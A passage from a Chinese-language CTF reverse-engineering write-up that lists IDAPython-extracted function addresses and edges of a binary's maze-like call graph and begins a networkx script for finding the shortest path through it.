4295856, None, None], [4295696, 4296016, None, None], [4295856, 4296176, None, None], [4296016, 4296336, None, None], [4296176, 4296496, None, None], [4296336, 4296656, None, None], [4296496, 4296816, None, None], [4296656, None, 4297424, None], [None, None, 4297584, 4286656], [None, None, 4297744, 4286816], [None, None, 4297904, 4294320], [None, None, 4299472, 4296816], [None, None, 4300720, 4296976], [None, None, 4302288, 4297136], [None, None, 4308576, 4297296], [None, 4298224, 4308720, None], [4298064, 4298384, None, None], [4298224, 4298528, None, None], [4298384, 4298688, None, None], [4298528, 4298848, None, None], [4298688, 4299008, None, None], [4298848, 4299168, None, None], [4299008, 4299312, None, None], [4299168, 4299472, None, None], [4299312, 4299632, None, 4297424], [4299472, 4299792, None, None], [4299632, 4299936, None, None], [4299792, 4300096, None, None], [4299936, 4300256, None, None], [4300096, 4300416, None, None], [4300256, 4300576, None, None], [4300416, None, None, None], [None, 4300864, None, 4297584], [4300720, 4301024, None, None], [4300864, 4301184, None, None], [4301024, 4301344, None, None], [4301184, 4301504, None, None], [4301344, 4301648, None, None], [4301504, 4301808, None, None], [4301648, 4301968, None, None], [4301808, 4302128, None, None], [4301968, 4302288, None, None], [4302128, 4302448, None, 4297744], [4302288, 4302608, None, None], [4302448, 4302768, None, None], [4302608, 4302912, None, None], [4302768, 4303072, None, None], [4302912, 4303232, None, None], [4303072, 4303392, None, None], [4303232, 4303552, None, None], [4303392, 4303712, None, None], [4303552, 4303872, None, None], [4303712, 4304032, None, None], [4303872, 4304192, None, None], [4304032, 4304352, None, None], [4304192, 4304496, None, None], [4304352, 4304656, None, None], [4304496, 4304816, None, None], [4304656, 4304976, None, None], [4304816, 4305136, None, None], [4304976, 4305296, None, None], [4305136, 4305456, None, None], [4305296, 4305616, None, None], [4305456, 4305776, None, None], [4305616, 4305936, None, None], [4305776, 4306096, None, None], [4305936, 4306256, None, None], [4306096, 4306400, None, None], [4306256, 4306560, None, None], [4306400, 4306720, None, None], [4306560, 4306880, None, None], [4306720, 4307024, None, None], [4306880, 4307184, None, None], [4307024, 4307344, None, None], [4307184, 4307504, None, None], [4307344, 4307664, None, None], [4307504, 4307808, None, None], [4307664, 4307968, None, None], [4307808, 4308128, None, None], [4307968, 4308288, None, None], [4308128, 4308448, None, None], [4308288, None, None, None], [None, None, 4308880, 4297904], [None, None, 4309040, 4298064], [None, None, 4311264, 4308576], [None, None, 4311888, 4308720], [None, 4309360, 4312336, None], [4309200, 4309520, 4312496, None], [4309360, None, 4312624, None], [None, None, 4313872, None], [None, 4309984, 4315312, None], [4309824, None, 4315472, None], [None, 4310304, 4316112, None], [4310144, 4310464, 4316272, None], [4310304, 4310624, 4316432, None], [4310464, 4310784, 4316592, None], [4310624, 4310944, 4316736, None], [4310784, 4311104, 4316896, None], [4310944, None, 4317024, None], [None, 4311424, 4317664, 4308880], [4311264, 4311584, 4317824, None], [4311424, 4311744, 4317984, None], [4311584, None, 4318112, None], [None, None, 4318752, 4309040], [None, 4312176, None, None], [4312048, 4312336, 4318896, None], [4312176, 4312496, None, 4309200], [4312336, 4312624, None, 4309360], [4312496, 4312784, None, 4309520], [4312624, 4312928, None, None], [4312784, 4313088, None, None], [4312928, 4313248, None, None], [4313088, 4313408, None, None], [4313248, 4313568, None, None], [4313408, 4313712, None, None], [4313568, 4313872, 4319056, None], [4313712, 4314032, None, 4309680], [4313872, 4314192, 4319200, None], [4314032, 4314352, None, None], [4314192, 4314512, None, None], [4314352, 4314672, None, None], [4314512, 4314832, None, None], [4314672, 4314992, None, None], [4314832, 4315152, None, None], [4314992, 4315312, 4319328, None], [4315152, 4315472, None, 4309824], [4315312, 4315632, None, 4309984], [4315472, 4315792, 4319472, None], [4315632, 4315952, None, None], [4315792, 4316112, None, None], [4315952, 4316272, None, 4310144], [4316112, 4316432, None, 4310304], [4316272, 4316592, None, 4310464], [4316432, 4316736, 4319616, 4310624], [4316592, 4316896, None, 4310784], [4316736, 4317024, None, 4310944], [4316896, 4317184, None, 4311104], [4317024, 4317344, None, None], [4317184, 4317504, None, None], [4317344, 4317664, 4319760, None], [4317504, 4317824, None, 4311264], [4317664, 4317984, None, 4311424], [4317824, 4318112, None, 4311584], [4317984, 4318272, None, 4311744], [4318112, 4318432, None, None], [4318272, 4318592, None, None], [4318432, 4318752, None, None], [4318592, None, None, 4311888], [None, None, 4319920, 4312176], [None, None, None, 4313712], [None, None, None, 4314032], [None, None, None, 4315152], [None, None, None, 4315632], [None, None, 4320080, 4316592], [None, None, 4320240, 4317504], [None, None, 4321472, 4318896], [None, None, 4321600, 4319616], [None, 4320400, 4321760, 4319760], [4320240, 4320560, None, None], [4320400, 4320720, None, None], [4320560, 4320880, None, None], [4320720, 4321024, None, None], [4320880, 4321184, None, None], [4321024, 4321344, None, None], [4321184, None, None, None], [None, None, None, 4319920], [None, None, 4321904, 4320080], [None, None, None, 4320240], [None, None, None, 4321600]]</span><br><span class="line">len(func_list): 788</span><br><span class="line">len(all_edges): 788</span><br><span class="line">[4198480, 4198624, 4198784, 4198944, 4199104, 4199264, 4199424, 4199584, 4199744, 4199904, 4200064, 4200224, 4200384, 4200544, 4200688, 4200848, 4201008, 4201168, 4201312, 4201456, 4201616, 4201776, 4201936, 4202096, 4202240, 4202384, 4202544, 4202704, 4202848, 4203008, 4203168, 4203328, 4203488, 4203648, 4203808, 4203968, 4204128, 4204272, 4204432, 4204592, 4204752, 4204912, 4205056, 4205216, 4205376, 4205536, 4205680, 4205824, 4205984, 4206144, 4206304, 4206448, 4206608, 4206768, 4206928, 4207088, 4207232, 4207392, 4207552, 4207712, 4207872, 4208032, 4208192, 4208352, 4208496, 4208656, 4208816, 4208960, 4209120, 4209280, 4209440, 4209600, 4209760, 4209904, 4210064, 4210224, 4210368, 4210528, 4210688, 4210832, 4210992, 4211152, 4211312, 4211472, 4211632, 4211792, 4211952, 4212112, 4212272, 4212432, 4212592, 4212752, 4212912, 4213072, 4213232, 4213392, 4213552, 4213696, 4213856, 4214016, 4214176, 4214320, 4214480, 4214640, 4214800, 4214960, 4215120, 4215280, 4215440, 4215584, 4215744, 4215904, 4216064, 4216208, 4216352, 4216512, 4216672, 4216832, 4216992, 4217136, 4217296, 4217440, 4217600, 4217760, 4217920, 4218080, 4218240, 4218400, 4218560, 4218720, 4218880, 4219040, 4219200, 4219360, 4219520, 4219680, 4219840, 4219984, 4220144, 4220304, 4220464, 4220608, 4220768, 4220928, 4221088, 4221232, 4221392, 4221552, 4221712, 4221872, 4222032, 4222192, 4222352, 4222496, 4222640, 4222800, 4222928, 4223088, 4223248, 4223408, 4223568, 4223712, 4223856, 4224016, 4224176, 4224336, 4224496, 4224656, 4224816, 4224976, 4225120, 4225264, 4225424, 4225584, 4225744, 4225888, 4226048, 4226208, 4226368, 4226528, 4226688, 4226848, 4227008, 4227168, 4227328, 4227488, 4227648, 4227808, 4227968, 4228112, 4228272, 4228416, 4228576, 4228736, 4228896, 4229056, 4229216, 4229376, 4229520, 4229680, 4229840, 4229984, 4230144, 4230288, 4230448, 4230608, 4230768, 4230928, 4231088, 4231248, 4231408, 4231568, 4231728, 4231888, 4232048, 4232208, 4232368, 4232528, 4232672, 4232832, 4232992, 4233152, 4233312, 4233472, 4233616, 4233776, 4233920, 4234080, 4234240, 4234400, 4234560, 4234720, 4234880, 4235040, 4235200, 4235328, 4235488, 4235632, 4235792, 4235952, 4236112, 4236272, 4236432, 4236576, 4236736, 4236896, 4237056, 4237216, 4237376, 4237520, 4237664, 4237824, 4237984, 4238144, 4238304, 4238464, 4238624, 4238784, 4238944, 4239104, 4239264, 4239424, 4239584, 4239744, 4239904, 4240064, 4240224, 4240368, 4240528, 4240688, 4240848, 4241008, 4241168, 4241312, 4241456, 4241616, 4241776, 4241936, 4242096, 4242256, 4242416, 4242576, 4242736, 4242896, 4243040, 4243200, 4243360, 4243504, 4243664, 4243824, 4243984, 4244144, 4244288, 4244448, 4244608, 4244768, 4244928, 4245072, 4245232, 4245392, 4245536, 4245696, 4245840, 4246000, 4246160, 4246320, 4246480, 4246640, 4246800, 4246960, 4247120, 4247280, 4247440, 4247600, 4247744, 4247904, 4248064, 4248224, 4248384, 4248544, 4248704, 4248864, 4249024, 4249184, 4249344, 4249504, 4249664, 4249824, 4249984, 4250144, 4250304, 4250464, 4250624, 4250784, 4250944, 4251088, 4251248, 4251408, 4251568, 4251712, 4251872, 4252032, 4252192, 4252336, 4252496, 4252656, 4252816, 4252976, 4253136, 4253296, 4253456, 4253616, 4253776, 4253936, 4254096, 4254240, 4254400, 4254544, 4254704, 4254848, 4255008, 4255152, 4255312, 4255472, 4255616, 4255776, 4255936, 4256080, 4256240, 4256400, 4256560, 4256704, 4256848, 4257008, 4257152, 4257312, 4257472, 4257632, 4257760, 4257920, 4258080, 4258240, 4258400, 4258544, 4258704, 4258864, 4259024, 4259184, 4259344, 4259488, 4259648, 4259808, 4259968, 4260128, 4260288, 4260448, 4260592, 4260752, 4260912, 4261072, 4261232, 4261392, 4261552, 4261712, 4261872, 4262032, 4262176, 4262320, 4262480, 4262640, 4262800, 4262960, 4263120, 4263280, 4263440, 4263600, 4263760, 4263920, 4264080, 4264240, 4264400, 4264560, 4264720, 4264880, 4265040, 4265200, 4265344, 4265504, 4265648, 4265792, 4265952, 4266112, 4266272, 4266432, 4266592, 4266752, 4266912, 4267072, 4267232, 4267392, 4267552, 4267712, 4267872, 4268032, 4268192, 4268352, 4268496, 4268656, 4268816, 4268976, 4269136, 4269296, 4269456, 4269616, 4269760, 4269920, 4270080, 4270240, 4270400, 4270560, 4270720, 4270880, 4271040, 4271184, 4271328, 4271488, 4271648, 4271808, 4271968, 4272128, 4272288, 4272448, 4272608, 4272768, 4272928, 4273088, 4273248, 4273392, 4273552, 4273696, 4273840, 4274000, 4274160, 4274320, 4274480, 4274640, 4274800, 4274960, 4275120, 4275280, 4275440, 4275584, 4275744, 4275904, 4276064, 4276208, 4276368, 4276528, 4276688, 4276848, 4277008, 4277168, 4277328, 4277488, 4277648, 4277808, 4277968, 4278128, 4278288, 4278448, 4278608, 4278768, 4278928, 4279072, 4279216, 4279376, 4279536, 4279696, 4279840, 4280000, 4280160, 4280304, 4280464, 4280624, 4280784, 4280944, 4281088, 4281248, 4281408, 4281568, 4281728, 4281888, 4282048, 4282208, 4282352, 4282512, 4282656, 4282816, 4282976, 4283136, 4283296, 4283456, 4283616, 4283776, 4283936, 4284096, 4284256, 4284416, 4284576, 4284736, 4284896, 4285056, 4285216, 4285376, 4285536, 4285696, 4285856, 4286016, 4286176, 4286336, 4286496, 4286656, 4286816, 4286976, 4287120, 4287264, 4287424, 4287584, 4287744, 4287904, 4288064, 4288224, 4288384, 4288528, 4288688, 4288848, 4288992, 4289152, 4289312, 4289472, 4289632, 4289792, 4289952, 4290112, 4290272, 4290432, 4290592, 4290752, 4290912, 4291072, 4291232, 4291376, 4291536, 4291696, 4291856, 4292000, 4292144, 4292288, 4292448, 4292608, 4292768, 4292928, 4293088, 4293248, 4293392, 4293552, 4293696, 4293856, 4294016, 4294160, 4294320, 4294480, 4294640, 4294800, 4294944, 4295088, 4295232, 4295392, 4295552, 4295696, 4295856, 4296016, 4296176, 4296336, 4296496, 4296656, 4296816, 4296976, 4297136, 4297296, 4297424, 4297584, 4297744, 4297904, 4298064, 4298224, 4298384, 4298528, 4298688, 4298848, 4299008, 4299168, 4299312, 4299472, 4299632, 4299792, 4299936, 4300096, 4300256, 4300416, 4300576, 4300720, 4300864, 4301024, 4301184, 4301344, 4301504, 4301648, 4301808, 4301968, 4302128, 4302288, 4302448, 4302608, 4302768, 4302912, 4303072, 4303232, 4303392, 4303552, 4303712, 4303872, 4304032, 4304192, 4304352, 4304496, 4304656, 4304816, 4304976, 4305136, 4305296, 4305456, 4305616, 4305776, 4305936, 4306096, 4306256, 4306400, 4306560, 4306720, 4306880, 4307024, 4307184, 4307344, 4307504, 4307664, 4307808, 4307968, 4308128, 4308288, 4308448, 4308576, 4308720, 4308880, 4309040, 4309200, 4309360, 4309520, 4309680, 4309824, 4309984, 4310144, 4310304, 4310464, 4310624, 4310784, 4310944, 4311104, 4311264, 4311424, 4311584, 4311744, 4311888, 4312048, 4312176, 4312336, 4312496, 4312624, 4312784, 4312928, 4313088, 4313248, 4313408, 4313568, 4313712, 4313872, 4314032, 4314192, 4314352, 4314512, 4314672, 4314832, 4314992, 4315152, 4315312, 4315472, 4315632, 4315792, 4315952, 4316112, 4316272, 4316432, 4316592, 4316736, 4316896, 4317024, 4317184, 4317344, 4317504, 4317664, 4317824, 4317984, 4318112, 4318272, 4318432, 4318592, 4318752, 4318896, 4319056, 4319200, 4319328, 4319472, 4319616, 4319760, 4319920, 4320080, 4320240, 4320400, 4320560, 4320720, 4320880, 4321024, 4321184, 4321344, 4321472, 4321600, 4321760, 4321904]</span><br></pre></td></tr></table></figure><blockquote><p>对于IDAPython简单函数的学习，可以参考 <a href="https://zzzzsky.com/2021/12/08/LearnIDAPython/">https://zzzzsky.com/2021/12/08/LearnIDAPython/</a></p></blockquote><p>至此，我们找到了所有的节点，以及每个节点对应的adsw对应的4个值，如果为None说明不通，如果不为None，说明是进入的另外一个函数，就可以构造一条边</p><h4 id="networkx求最短路径"><a href="#networkx求最短路径" class="headerlink" title="networkx求最短路径"></a>networkx求最短路径</h4><p>写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">all_edges = [[<span class="literal">None</span>, <span class="number">4198624</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4198480</span>, <span class="literal">None</span>, <span class="number">4198784</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4207712</span>, <span class="number">4198624</span>], [<span class="literal">None</span>, <span class="number">4199104</span>, <span class="number">4211312</span>, <span class="literal">None</span>], [<span class="number">4198944</span>, <span class="number">4199264</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4199104</span>, <span class="number">4199424</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4199264</span>, <span class="number">4199584</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4199424</span>, <span class="number">4199744</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4199584</span>, <span class="number">4199904</span>, <span class="number">4211472</span>, <span class="literal">None</span>], [<span class="number">4199744</span>, <span class="number">4200064</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4199904</span>, <span class="number">4200224</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200064</span>, <span class="number">4200384</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200224</span>, <span class="number">4200544</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200384</span>, <span class="number">4200688</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200544</span>, <span class="number">4200848</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200688</span>, <span class="number">4201008</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4200848</span>, <span class="number">4201168</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201008</span>, <span class="number">4201312</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201168</span>, <span class="number">4201456</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201312</span>, <span class="number">4201616</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201456</span>, <span class="number">4201776</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201616</span>, <span class="number">4201936</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201776</span>, <span class="number">4202096</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4201936</span>, <span class="number">4202240</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202096</span>, <span class="number">4202384</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202240</span>, <span class="number">4202544</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202384</span>, <span class="number">4202704</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202544</span>, <span class="number">4202848</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202704</span>, <span class="number">4203008</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4202848</span>, <span class="number">4203168</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203008</span>, <span class="number">4203328</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203168</span>, <span class="number">4203488</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203328</span>, <span class="number">4203648</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203488</span>, <span class="number">4203808</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203648</span>, <span class="number">4203968</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203808</span>, <span class="number">4204128</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4203968</span>, <span class="number">4204272</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204128</span>, <span class="number">4204432</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204272</span>, <span class="number">4204592</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204432</span>, <span class="number">4204752</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204592</span>, <span class="number">4204912</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204752</span>, <span class="number">4205056</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4204912</span>, <span class="number">4205216</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4205056</span>, <span class="number">4205376</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4205216</span>, <span class="number">4205536</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4205376</span>, <span class="literal">None</span>, <span class="number">4211632</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="number">4205824</span>, <span class="number">4211792</span>, <span class="literal">None</span>], [<span class="number">4205680</span>, <span class="number">4205984</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4205824</span>, <span class="number">4206144</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4205984</span>, <span class="number">4206304</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206144</span>, <span class="number">4206448</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206304</span>, <span class="number">4206608</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206448</span>, <span class="number">4206768</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206608</span>, <span class="number">4206928</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206768</span>, <span class="number">4207088</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4206928</span>, <span class="number">4207232</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4207088</span>, <span class="number">4207392</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4207232</span>, <span class="number">4207552</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4207392</span>, <span class="literal">None</span>, <span class="number">4211952</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="number">4207872</span>, <span class="literal">None</span>, <span class="number">4198784</span>], [<span class="number">4207712</span>, <span class="number">4208032</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4207872</span>, <span class="number">4208192</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208032</span>, <span class="number">4208352</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208192</span>, <span class="number">4208496</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208352</span>, <span class="number">4208656</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208496</span>, <span class="number">4208816</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208656</span>, <span class="number">4208960</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4208816</span>, <span class="number">4209120</span>, <span class="number">4212112</span>, <span class="literal">None</span>], [<span class="number">4208960</span>, <span class="number">4209280</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209120</span>, <span class="number">4209440</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209280</span>, <span class="number">4209600</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209440</span>, <span class="number">4209760</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209600</span>, <span class="number">4209904</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209760</span>, <span class="number">4210064</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4209904</span>, <span class="number">4210224</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210064</span>, <span class="number">4210368</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210224</span>, <span class="number">4210528</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210368</span>, <span class="number">4210688</span>, <span class="number">4212272</span>, <span class="literal">None</span>], [<span class="number">4210528</span>, <span class="number">4210832</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210688</span>, <span class="number">4210992</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210832</span>, <span class="number">4211152</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4210992</span>, <span class="number">4211312</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4211152</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4198944</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4212432</span>, <span class="number">4199744</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4216832</span>, <span class="number">4205536</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4216992</span>, <span class="number">4205680</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4217136</span>, <span class="number">4207552</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4218240</span>, <span class="number">4208960</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4218400</span>, <span class="number">4210528</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4218560</span>, <span class="number">4211472</span>], [<span class="literal">None</span>, <span class="number">4212752</span>, <span class="number">4218720</span>, <span class="literal">None</span>], [<span class="number">4212592</span>, <span class="number">4212912</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4212752</span>, <span class="number">4213072</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4212912</span>, <span class="number">4213232</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213072</span>, <span class="number">4213392</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213232</span>, <span class="number">4213552</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213392</span>, <span class="number">4213696</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213552</span>, <span class="number">4213856</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213696</span>, <span class="number">4214016</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4213856</span>, <span class="number">4214176</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214016</span>, <span class="number">4214320</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214176</span>, <span class="number">4214480</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214320</span>, <span class="number">4214640</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214480</span>, <span class="number">4214800</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214640</span>, <span class="number">4214960</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214800</span>, <span class="number">4215120</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4214960</span>, <span class="number">4215280</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215120</span>, <span class="number">4215440</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215280</span>, <span class="number">4215584</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215440</span>, <span class="number">4215744</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215584</span>, <span class="number">4215904</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215744</span>, <span class="number">4216064</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4215904</span>, <span class="number">4216208</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4216064</span>, <span class="number">4216352</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4216208</span>, <span class="number">4216512</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4216352</span>, <span class="number">4216672</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4216512</span>, <span class="literal">None</span>, <span class="number">4218880</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4219040</span>, <span class="number">4211632</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4219200</span>, <span class="number">4211792</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4219360</span>, <span class="number">4211952</span>], [<span class="literal">None</span>, <span class="number">4217440</span>, <span class="number">4219520</span>, <span class="literal">None</span>], [<span class="number">4217296</span>, <span class="number">4217600</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4217440</span>, <span class="number">4217760</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4217600</span>, <span class="number">4217920</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4217760</span>, <span class="number">4218080</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4217920</span>, <span class="literal">None</span>, <span class="number">4219680</span>, <span class="literal">None</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4219840</span>, <span class="number">4212112</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4219984</span>, <span class="number">4212272</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4220144</span>, <span class="number">4212432</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4220304</span>, <span class="number">4212592</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4220464</span>, <span class="number">4216672</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4220608</span>, <span class="number">4216832</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4220768</span>, <span class="number">4216992</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4222032</span>, <span class="number">4217136</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4222192</span>, <span class="number">4217296</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4222352</span>, <span class="number">4218080</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4222496</span>, <span class="number">4218240</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4222640</span>, <span class="number">4218400</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4223248</span>, <span class="number">4218560</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4223856</span>, <span class="number">4218720</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4225584</span>, <span class="number">4218880</span>], [<span class="literal">None</span>, <span class="literal">None</span>, <span class="number">4225744</span>, <span class="number">4219040</span>], [<span class="literal">None</span>, <span class="number">4220928</span>, <span class="literal">None</span>, <span class="number">4219200</span>], [<span class="number">4220768</span>, <span class="number">4221088</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4220928</span>, <span class="number">4221232</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4221088</span>, <span class="number">4221392</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4221232</span>, <span class="number">4221552</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4221392</span>, <span class="number">4221712</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4221552</span>, <span class="number">4221872</span>, <span class="literal">None</span>, <span class="literal">None</span>], [<span class="number">4221712</span>, <span class="literal">None</span>, <span class="number">4225888</span>, <span class="literal">None</span>], [<span class="literal">None</span>, 